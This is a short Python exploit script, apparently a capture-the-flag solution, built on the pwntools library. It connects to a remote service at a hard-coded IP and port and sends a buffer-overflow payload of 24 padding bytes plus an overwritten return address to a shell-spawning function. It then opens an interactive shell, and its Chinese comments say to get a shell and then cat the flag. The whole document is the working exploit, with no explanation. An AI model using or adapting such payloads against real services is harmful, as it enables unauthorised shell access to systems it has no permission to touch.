#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
r.sendline(b"+" * 24 + p64(0x004005B6))
r.interactive()
# 获取一个shell
# 然后直接cat
